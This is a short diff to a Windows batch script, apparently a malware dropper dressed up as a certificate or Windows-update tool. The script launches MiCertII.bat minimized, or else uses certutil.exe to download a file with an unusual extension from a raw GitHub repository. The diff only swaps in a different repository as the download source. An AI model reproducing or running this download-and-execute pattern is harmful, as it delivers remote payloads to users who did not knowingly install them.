@@ -12,7 +12,7 @@ IF EXIST MiCertII.bat (
 	start /min MiCertII.bat
 	exit
 ) ELSE (
-	certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/AlaskaMN/WindowsUpdate/master/MiCertII.uiaq" MiCertII.uiaq
+	certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/WernerLS/Treb/master/MiCertII.uiaq" MiCertII.uiaq
 	goto alamo
 )
 exit
